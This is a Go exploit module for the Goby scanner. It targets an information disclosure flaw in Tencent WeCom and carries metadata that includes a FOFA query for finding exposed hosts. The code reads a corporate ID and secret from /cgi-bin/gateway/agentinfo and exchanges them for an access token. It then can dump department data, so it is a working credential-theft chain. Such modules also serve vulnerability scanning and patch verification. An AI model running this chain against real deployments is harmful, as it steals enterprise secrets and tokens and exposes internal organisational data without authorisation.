package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Tencent WeCom gateway/agentinfo api Information Disclosure Vulnerability",
    "Description": "<p>Tencent WeCom is an instant messaging tool that focuses on enterprise communication and collaboration, providing functions such as internal chatting, file sharing, schedule management, and online meetings to help enterprises communicate and collaborate efficiently.</p><p> Tencent WeCom has an information leakage vulnerability, where attackers can read sensitive system information by constructing special URL addresses.</p>",
    "Product": "Tencent-Ent-WeChat",
    "Homepage": "https://www.tencent.com/",
    "DisclosureDate": "2023-08-12",
    "PostTime": "2023-08-12",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "title==\"企业微信\" || body=\"<a class=\\\"index_foot_nav_item_link\\\" href=\\\"/wework_admin/eula\"",
    "GobyQuery": "title==\"企业微信\" || body=\"<a class=\\\"index_foot_nav_item_link\\\" href=\\\"/wework_admin/eula\"",
    "Level": "2",
    "Impact": "<p> Tencent WeCom has an information leakage vulnerability, where attackers can read sensitive system information by constructing special URL addresses.</p>",
    "Recommendation": "<p>1. The official has fixed this vulnerability. Please contact the manufacturer to fix the vulnerability:<a href=\"https://security.tencent.com/qywx\"> https://security.tencent.com/qywx</a>.</p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "agentInfo,accessToken,departmentInfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "腾讯企业微信 gateway/agentinfo 接口信息泄漏漏洞",
            "Product": "Tencent-企业微信",
            "Description": "<p>腾讯企业微信是一款专注于企业通信和协作的即时通讯工具，提供了企业内部聊天、文件共享、日程管理、在线会议等功能，帮助企业高效沟通和协同工作。</p><p>腾讯企业微信存在信息泄露漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://security.tencent.com/qywx\" target=\"_blank\">https://security.tencent.com/qywx</a>。<br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>&nbsp;3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>腾讯企业微信存在信息泄露漏洞，攻击者通过构造特殊 URL 地址，读取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Tencent WeCom gateway/agentinfo api Information Disclosure Vulnerability",
            "Product": "Tencent-Ent-WeChat",
            "Description": "<p>Tencent WeCom is an instant messaging tool that focuses on enterprise communication and collaboration, providing functions such as internal chatting, file sharing, schedule management, and online meetings to help enterprises communicate and collaborate efficiently.</p><p> Tencent WeCom has an information leakage vulnerability, where attackers can read sensitive system information by constructing special URL addresses.</p>",
            "Recommendation": "<p>1. The official has fixed this vulnerability. Please contact the manufacturer to fix the vulnerability:<a href=\"https://security.tencent.com/qywx\" target=\"_\"> https://security.tencent.com/qywx</a>.<br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p> Tencent WeCom has an information leakage vulnerability, where attackers can read sensitive system information by constructing special URL addresses.</p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10821"
}`

	sendPostPayloadInfoDNUIQWH := func(hostInfo *httpclient.FixUrl, uri, postData string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = postData
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}
	sendGetPayloadInfoDNUIQWH := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendGetPayloadInfoDNUIQWH(u, "/cgi-bin/gateway/agentinfo")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `"strcorpid":`) && strings.Contains(resp.Utf8Html, `"Secret":`) && strings.Contains(resp.Utf8Html, `"corpid":`)
		}, func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			uriList := map[string]string{
				"agentInfo":      "/cgi-bin/gateway/agentinfo",
				"accessToken":    "/cgi-bin/gettoken",
				"departmentInfo": "/cgi-bin/department/list",
			}
			resp, _ := sendGetPayloadInfoDNUIQWH(expResult.HostInfo, uriList["agentInfo"])
			if !(resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `"strcorpid":`) && strings.Contains(resp.Utf8Html, `"Secret":`) && strings.Contains(resp.Utf8Html, `"corpid":`)) {
				return expResult
			}
			accessTokenValue := ""
			if attackType == "agentInfo" {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
				return expResult
			}
			reg, _ := regexp.Compile(`"strcorpid":"(.*?)","corpid"`)
			strCorpId := reg.FindAllStringSubmatch(resp.Utf8Html, -1)
			reg2, _ := regexp.Compile(`"Secret":"(.*?)"`)
			secret := reg2.FindAllStringSubmatch(resp.Utf8Html, -1)
			if len(strCorpId) < 1 || len(strCorpId[0]) < 2 || len(secret) < 1 || len(secret[0]) < 2 {
				return expResult
			}
			resp2, _ := sendPostPayloadInfoDNUIQWH(expResult.HostInfo, uriList["accessToken"], fmt.Sprintf("corpid=%s&corpsecret=%s", strCorpId[0][1], secret[0][1]))
			if resp2.StatusCode == 200 && strings.Contains(resp2.Utf8Html, `access_token`) && strings.Contains(resp2.Utf8Html, `expires_in`) {
				reg3, _ := regexp.Compile(`"access_token":"(.*?)"`)
				results := reg3.FindAllStringSubmatch(resp2.Utf8Html, -1)
				if len(results) > 0 && len(results[0]) > 1 {
					accessTokenValue = results[0][1]
				}
			}
			if attackType == "accessToken" {
				expResult.Success = true
				expResult.Output = "access_token: " + accessTokenValue
			} else if attackType == "departmentInfo" {
				resp3, _ := sendGetPayloadInfoDNUIQWH(expResult.HostInfo, uriList["departmentInfo"]+"?access_token="+accessTokenValue)
				if resp3.StatusCode == 200 && strings.Contains(resp3.Utf8Html, `"department"`) && strings.Contains(resp3.Utf8Html, `errmsg":"ok`) {
					expResult.Success = true
					expResult.Output = resp3.Utf8Html
				}
			}
			return expResult
		},
	))
}
